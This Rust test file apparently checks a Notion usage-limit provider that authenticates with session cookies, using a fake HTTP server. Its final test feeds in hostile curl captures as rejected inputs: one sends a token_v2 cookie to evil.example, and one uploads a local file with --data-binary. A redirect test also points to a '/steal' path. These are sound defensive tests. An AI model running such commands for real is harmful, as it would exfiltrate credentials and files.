use std::time::Duration;

use oab_domain::{AccountKey, AccountScope, ErrorKind, ProviderId, ProviderInstanceId, Timestamp};
use oab_providers::context::ProviderContext;
use oab_providers::cookie::{
    CookieDomainKind, CookieImport, CookieImportOrder, CookieJar, CookieRecord, CookieRecordSpec,
    CookieSourceId,
};
use oab_providers::descriptor::ProviderSource;
use oab_providers::providers::notion::{NotionProvider, NotionRouteSet, parse_spaces_response};
use oab_test_support::http::{FakeHttpResponse, FakeHttpServer};
use time::OffsetDateTime;
use tokio_util::sync::CancellationToken;

const SPACES: &[u8] = include_bytes!("../../../fixtures/providers/notion/get-spaces.json");
const USAGE: &[u8] =
    include_bytes!("../../../fixtures/providers/notion/get-credit-rate-limit-status.json");
const NOW_SECONDS: i64 = 1_785_600_000;
const BUSINESS_SPACE: &str = "11111111-2222-3333-4444-555555555555";
const PERSONAL_SPACE: &str = "66666666-7777-8888-9999-aaaaaaaaaaaa";
const USER_ID: &str = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
const COOKIE_CANARY: &str = "notion-cookie-canary";
const SESSION_COOKIE_NAME: &str = "token_v2";

fn scope(account: &str) -> AccountScope {
    AccountScope::new(
        ProviderId::Notion,
        ProviderInstanceId::new("notion-primary").expect("provider instance"),
        AccountKey::new(account).expect("account key"),
    )
}

fn timestamp() -> Timestamp {
    Timestamp::from_unix_timestamp(NOW_SECONDS).expect("fixture timestamp")
}

fn now() -> OffsetDateTime {
    OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("fixture time")
}

fn context(account: &str, source: ProviderSource) -> ProviderContext {
    ProviderContext::new(scope(account), source, CancellationToken::new())
}

fn routes(server: &FakeHttpServer) -> NotionRouteSet {
    NotionRouteSet::loopback(server.url("/")).expect("loopback Notion routes")
}

fn manual_provider(
    server: &FakeHttpServer,
    capture: &str,
    preferred: Option<&str>,
) -> NotionProvider {
    NotionProvider::from_manual_capture_routes(
        scope("account-a"),
        capture,
        preferred,
        routes(server),
    )
    .expect("manual Notion provider")
}

fn cookie_record(
    name: &str,
    value: &str,
    domain: &str,
    domain_kind: CookieDomainKind,
) -> CookieRecord {
    CookieRecord::new(CookieRecordSpec {
        name,
        value,
        domain,
        domain_kind,
        path: "/",
        secure: true,
        expires_at: Some(now() + time::Duration::days(1)),
    })
    .expect("cookie record")
}

fn cookie_jar(records: Vec<CookieRecord>) -> CookieJar {
    let source = CookieSourceId::new(71);
    let order = CookieImportOrder::new([source]).expect("cookie order");
    let import = CookieImport::new(source, records).expect("cookie import");
    CookieJar::from_imports(&order, [import]).expect("cookie jar")
}

fn empty_cookie_jar() -> CookieJar {
    cookie_jar(Vec::new())
}

fn assert_percent(actual: f64, expected: f64) {
    assert!((actual - expected).abs() < 1e-9, "{actual} != {expected}");
}

#[test]
fn spaces_parser_matches_wrapping_selection_and_ambiguity_contracts() {
    let account = parse_spaces_response(SPACES).expect("double-wrapped fixture");
    assert_eq!(account.user_id(), Some(USER_ID));
    assert_eq!(account.email(), Some("person@example.com"));
    assert_eq!(account.name(), Some("Example Person"));
    assert_eq!(account.workspaces().len(), 2);
    assert_eq!(account.workspaces()[0].id(), BUSINESS_SPACE);
    assert_eq!(account.workspaces()[0].name(), Some("Acme"));
    assert_eq!(account.workspaces()[0].plan_type(), Some("team"));
    assert_eq!(
        account.workspaces()[0].subscription_tier(),
        Some("business")
    );

    let single = format!(
        r#"{{"{USER_ID}":{{"notion_user":{{"{USER_ID}":{{"value":{{"id":"{USER_ID}","email":"legacy@example.com"}}}}}},"space":{{"{BUSINESS_SPACE}":{{"value":{{"id":"{BUSINESS_SPACE}","name":"Legacy"}}}}}}}}}}"#
    );
    let account = parse_spaces_response(single.as_bytes()).expect("single-wrapped response");
    assert_eq!(account.email(), Some("legacy@example.com"));
    assert_eq!(account.workspaces()[0].name(), Some("Legacy"));

    let second = "bbbbbbbb-cccc-dddd-eeee-ffffffffffff";
    let ambiguous = format!(
        r#"{{"{USER_ID}":{{"notion_user":{{"{USER_ID}":{{"value":{{"value":{{"id":"{USER_ID}"}}}}}}}}}},"{second}":{{"notion_user":{{"{second}":{{"value":{{"value":{{"id":"{second}"}}}}}}}}}}}}"#
    );
    assert_eq!(
        parse_spaces_response(ambiguous.as_bytes())
            .expect_err("ambiguous account")
            .kind(),
        ErrorKind::Parse
    );
}

#[tokio::test]
async fn golden_manual_fetch_maps_windows_identity_and_exact_requests() {
    let server = FakeHttpServer::start([
        FakeHttpResponse::new(200, SPACES.to_vec()),
        FakeHttpResponse::new(200, USAGE.to_vec()),
    ])
    .await;
    let provider = manual_provider(&server, COOKIE_CANARY, None);
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(),
        )
        .await
        .expect("Notion fixture");

    let primary = sample.primary().expect("rolling window");
    assert_percent(primary.used_percent().expect("known").get(), 42.5);
    assert_eq!(
        primary.duration().expect("six hours").seconds(),
        6 * 60 * 60
    );
    assert_eq!(
        primary.resets_at().expect("rolling reset").unix_timestamp(),
        NOW_SECONDS + 12_600
    );
    let monthly = sample.secondary().expect("monthly window");
    assert_percent(monthly.used_percent().expect("known").get(), 18.0);
    assert_eq!(
        monthly.duration().expect("monthly sentinel").seconds(),
        30 * 24 * 60 * 60
    );
    assert_eq!(
        monthly.resets_at().expect("period end").unix_timestamp(),
        1_788_000_000
    );
    assert_eq!(
        sample
            .identity()
            .provider_account_id()
            .expect("user id")
            .as_str(),
        USER_ID
    );
    assert_eq!(
        sample.identity().email().expect("email").as_str(),
        "person@example.com"
    );
    assert_eq!(
        sample
            .identity()
            .organization()
            .expect("workspace")
            .as_str(),
        "Acme"
    );
    assert_eq!(
        sample.identity().login_method().expect("tier").as_str(),
        "Business"
    );
    assert_eq!(sample.provenance()[0].source(), "notion");
    assert_eq!(sample.provenance()[0].strategy(), "manual_cookie");

    let requests = server.requests();
    assert_eq!(requests.len(), 2);
    assert_eq!(requests[0].method(), "POST");
    assert_eq!(requests[0].target(), "/api/v3/getSpaces");
    assert_eq!(requests[0].body(), b"{}");
    assert_eq!(requests[1].target(), "/api/v3/getCreditRateLimitStatus");
    assert_eq!(
        requests[1].body(),
        format!(r#"{{"spaceId":"{BUSINESS_SPACE}"}}"#).as_bytes()
    );
    for request in &requests {
        assert_eq!(
            request.header("cookie"),
            Some("token_v2=notion-cookie-canary")
        );
        assert_eq!(request.header("origin"), Some("https://app.notion.com"));
        assert_eq!(request.header("content-type"), Some("application/json"));
        assert_eq!(request.header("accept"), Some("*/*"));
        assert_eq!(request.header("sec-fetch-site"), Some("same-origin"));
    }
}

#[tokio::test]
async fn preferred_workspace_uuid_forms_and_unknown_fallback_match_baseline() {
    for (preferred, expected) in [
        (PERSONAL_SPACE.to_owned(), PERSONAL_SPACE),
        (PERSONAL_SPACE.replace('-', ""), PERSONAL_SPACE),
        (
            "00000000-0000-0000-0000-000000000000".to_owned(),
            BUSINESS_SPACE,
        ),
    ] {
        let server = FakeHttpServer::start([
            FakeHttpResponse::new(200, SPACES.to_vec()),
            FakeHttpResponse::new(200, USAGE.to_vec()),
        ])
        .await;
        let provider = manual_provider(&server, "token_v2=abc", Some(&preferred));
        provider
            .fetch_at(
                &context("account-a", ProviderSource::ManualCookie),
                timestamp(),
            )
            .await
            .expect("workspace fetch");
        assert_eq!(
            server.requests()[1].body(),
            format!(r#"{{"spaceId":"{expected}"}}"#).as_bytes()
        );
    }
}

#[tokio::test]
async fn missing_limits_preserve_unknown_lanes_and_overage_is_not_clamped() {
    let status = br#"{
      "status":"within_limit",
      "window":{"window":"30d","used":42},
      "billingPeriodWindow":{"used":120,"limit":100,"periodEndMs":0},
      "resetsInSeconds":-1
    }"#;
    let server = FakeHttpServer::start([
        FakeHttpResponse::new(200, SPACES.to_vec()),
        FakeHttpResponse::new(200, status.to_vec()),
    ])
    .await;
    let sample = manual_provider(&server, "token_v2=abc", None)
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(),
        )
        .await
        .expect("partial allowance");
    assert!(sample.primary().is_none());
    let monthly = sample.secondary().expect("measurable billing window");
    assert_percent(monthly.used_percent().expect("known").get(), 120.0);
    assert!(monthly.resets_at().is_none());
}

#[tokio::test]
async fn rolling_monthly_token_collision_is_lengthless_and_zero_reset_is_real() {
    let status = br#"{
      "status":"within_limit",
      "window":{"window":"30d","used":-5,"limit":100},
      "resetsInSeconds":0
    }"#;
    let server = FakeHttpServer::start([
        FakeHttpResponse::new(200, SPACES.to_vec()),
        FakeHttpResponse::new(200, status.to_vec()),
    ])
    .await;
    let sample = manual_provider(&server, "token_v2=abc", None)
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(),
        )
        .await
        .expect("rolling collision");
    let primary = sample.primary().expect("measurable rolling window");
    assert_percent(primary.used_percent().expect("known").get(), 0.0);
    assert!(primary.duration().is_none());
    assert_eq!(
        primary.resets_at().expect("reset at now").unix_timestamp(),
        NOW_SECONDS
    );
}

#[tokio::test]
async fn curl_forwarding_is_allowlisted_and_space_header_cannot_override_body() {
    let server = FakeHttpServer::start([
        FakeHttpResponse::new(200, SPACES.to_vec()),
        FakeHttpResponse::new(200, USAGE.to_vec()),
    ])
    .await;
    let capture = concat!(
        "curl 'https://app.notion.com/api/v3/getSpaces?captured=ignored' ",
        "-H 'Cookie: token_v2=notion-cookie-canary; notion_user_id=user-canary' ",
        "-H 'Accept: application/json' ",
        "-H 'Accept-Language: tr-TR,tr;q=0.9' ",
        "-H 'notion-client-version: version-canary' ",
        "-H 'x-notion-active-user-header: active-user-canary' ",
        "-H 'x-notion-space-id: forbidden-space-canary' ",
        "-H 'X-Ignored: ignored-header-canary'"
    );
    let provider = manual_provider(&server, capture, None);
    let debug = format!("{provider:?}");
    for canary in [
        COOKIE_CANARY,
        "user-canary",
        "version-canary",
        "active-user-canary",
    ] {
        assert!(!debug.contains(canary));
    }
    provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(),
        )
        .await
        .expect("captured request");
    for request in server.requests() {
        assert_eq!(request.header("accept"), Some("application/json"));
        assert_eq!(request.header("accept-language"), Some("tr-TR,tr;q=0.9"));
        assert_eq!(
            request.header("notion-client-version"),
            Some("version-canary")
        );
        assert_eq!(
            request.header("x-notion-active-user-header"),
            Some("active-user-canary")
        );
        assert!(request.header("x-notion-space-id").is_none());
        assert!(request.header("x-ignored").is_none());
    }
}

#[tokio::test]
async fn browser_domain_priority_deduplicates_names_and_requires_token_v2() {
    let jar = cookie_jar(vec![
        cookie_record(
            SESSION_COOKIE_NAME,
            "root-token-canary",
            "notion.com",
            CookieDomainKind::Domain,
        ),
        cookie_record(
            SESSION_COOKIE_NAME,
            "app-token-canary",
            "app.notion.com",
            CookieDomainKind::HostOnly,
        ),
        cookie_record(
            "notion_user_id",
            "account-canary",
            "notion.com",
            CookieDomainKind::Domain,
        ),
        cookie_record(
            "legacy",
            "legacy-canary",
            "notion.so",
            CookieDomainKind::HostOnly,
        ),
    ]);
    let server = FakeHttpServer::start([
        FakeHttpResponse::new(200, SPACES.to_vec()),
        FakeHttpResponse::new(200, USAGE.to_vec()),
    ])
    .await;
    let provider = NotionProvider::from_browser_jar_routes(
        scope("account-a"),
        &jar,
        now(),
        None,
        routes(&server),
    )
    .expect("browser provider");
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::BrowserSession),
            timestamp(),
        )
        .await
        .expect("browser fetch");
    assert_eq!(sample.provenance()[0].strategy(), "browser_session");
    assert_eq!(
        server.requests()[0].header("cookie"),
        Some("legacy=legacy-canary; notion_user_id=account-canary; token_v2=app-token-canary")
    );

    let unrelated = cookie_jar(vec![cookie_record(
        "other",
        "value",
        "app.notion.com",
        CookieDomainKind::HostOnly,
    )]);
    assert_eq!(
        NotionProvider::from_browser_jar_routes(
            scope("account-a"),
            &unrelated,
            now(),
            None,
            routes(&server),
        )
        .expect_err("missing session cookie")
        .kind(),
        ErrorKind::AuthenticationExpired
    );
    assert_eq!(
        NotionProvider::from_browser_jar_routes(
            scope("account-a"),
            &empty_cookie_jar(),
            now(),
            None,
            routes(&server),
        )
        .expect_err("empty browser jar")
        .kind(),
        ErrorKind::MissingCredential
    );
}

#[tokio::test]
async fn authoritative_statuses_match_pinned_error_contract() {
    for (status, expected) in [
        (401, ErrorKind::AuthenticationExpired),
        (403, ErrorKind::Api),
        (408, ErrorKind::Api),
        (429, ErrorKind::Api),
        (500, ErrorKind::Api),
        (201, ErrorKind::Api),
    ] {
        let server = FakeHttpServer::start([FakeHttpResponse::new(status, b"{}".to_vec())]).await;
        let error = manual_provider(&server, "token_v2=status-canary", None)
            .fetch_at(
                &context("account-a", ProviderSource::ManualCookie),
                timestamp(),
            )
            .await
            .expect_err("status must fail");
        assert_eq!(error.kind(), expected, "status {status}");
        assert!(!format!("{error:?} {error}").contains("status-canary"));
    }
}

#[tokio::test]
async fn not_applicable_empty_workspaces_and_changed_shapes_fail_closed() {
    let cases = [
        (
            SPACES.to_vec(),
            br#"{"status":"not_applicable"}"#.to_vec(),
            ErrorKind::Api,
        ),
        (
            br#"{"user":{"notion_user":{"user":{"value":{"id":"user"}}},"space":{}}}"#.to_vec(),
            USAGE.to_vec(),
            ErrorKind::Api,
        ),
        (
            SPACES.to_vec(),
            br#"{"errorId":"abc","name":"UnauthorizedError"}"#.to_vec(),
            ErrorKind::Parse,
        ),
    ];
    for (spaces, status, expected) in cases {
        let server = FakeHttpServer::start([
            FakeHttpResponse::new(200, spaces),
            FakeHttpResponse::new(200, status),
        ])
        .await;
        let error = manual_provider(&server, "token_v2=shape-canary", None)
            .fetch_at(
                &context("account-a", ProviderSource::ManualCookie),
                timestamp(),
            )
            .await
            .expect_err("shape must fail");
        assert_eq!(error.kind(), expected);
    }
}

#[tokio::test]
async fn response_bounds_truncation_and_depth_are_stable() {
    let oversized = vec![b' '; 2 * 1024 * 1024 + 1];
    let deep = ("[".repeat(50) + &"]".repeat(50)).into_bytes();
    for response in [
        FakeHttpResponse::new(200, oversized),
        FakeHttpResponse::truncated(200, 100, b"{}".to_vec()),
        FakeHttpResponse::new(200, deep),
    ] {
        let server = FakeHttpServer::start([response]).await;
        let error = manual_provider(&server, "token_v2=bounded-canary", None)
            .fetch_at(
                &context("account-a", ProviderSource::ManualCookie),
                timestamp(),
            )
            .await
            .expect_err("bounded response must fail");
        assert_eq!(error.kind(), ErrorKind::Parse);
    }
}

#[tokio::test]
async fn post_redirects_fail_closed_and_cross_origin_never_receives_cookie() {
    let foreign = FakeHttpServer::start([FakeHttpResponse::new(200, SPACES.to_vec())]).await;
    let origin =
        FakeHttpServer::start([FakeHttpResponse::new(302, Vec::new())
            .header("Location", foreign.url("/steal").as_str())])
        .await;
    let error = manual_provider(&origin, "token_v2=redirect-canary", None)
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(),
        )
        .await
        .expect_err("cross-origin redirect");
    // The shared Rust transport refuses body-bearing redirects before it reads
    // `Location`; this is stricter than Foundation's same-origin redirect path.
    assert_eq!(error.kind(), ErrorKind::Parse);
    tokio::time::sleep(Duration::from_millis(20)).await;
    assert!(foreign.requests().is_empty());
    assert_eq!(origin.requests().len(), 1);
}

#[tokio::test]
async fn cancellation_and_scope_source_isolation_are_enforced() {
    let server = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
    let provider = manual_provider(&server, "token_v2=cancel-canary", None);
    let cancellation = CancellationToken::new();
    let cancellation_trigger = cancellation.clone();
    let active_context = ProviderContext::new(
        scope("account-a"),
        ProviderSource::ManualCookie,
        cancellation,
    );
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(20)).await;
        cancellation_trigger.cancel();
    });
    let error = provider
        .fetch_at(&active_context, timestamp())
        .await
        .expect_err("cancelled request");
    assert_eq!(error.kind(), ErrorKind::Network);

    for wrong in [
        context("account-b", ProviderSource::ManualCookie),
        context("account-a", ProviderSource::BrowserSession),
    ] {
        assert_eq!(
            provider
                .fetch_at(&wrong, timestamp())
                .await
                .expect_err("scope/source mismatch")
                .kind(),
            ErrorKind::Api
        );
    }
}

#[tokio::test]
async fn manual_capture_validation_and_diagnostics_are_secret_free() {
    let server = FakeHttpServer::start(Vec::<FakeHttpResponse>::new()).await;
    for raw in [
        "",
        "curl https://evil.example/api -H 'Cookie: token_v2=foreign-secret-canary'",
        "curl https://app.notion.com/api -H 'Cookie: token_v2=first-duplicate-canary' -H 'Cookie: token_v2=second-duplicate-canary'",
        "curl https://app.notion.com/api --data-binary @/tmp/secret -H 'Cookie: token_v2=file-read-canary'",
        "token_v2=line-break-canary\ncontinued",
    ] {
        let error = NotionProvider::from_manual_capture_routes(
            scope("account-a"),
            raw,
            None,
            routes(&server),
        )
        .expect_err("unsafe capture");
        let diagnostic = format!("{error:?} {error}");
        for canary in [
            "foreign-secret-canary",
            "file-read-canary",
            "line-break-canary",
            "first-duplicate-canary",
            "second-duplicate-canary",
        ] {
            assert!(!diagnostic.contains(canary));
        }
    }
}
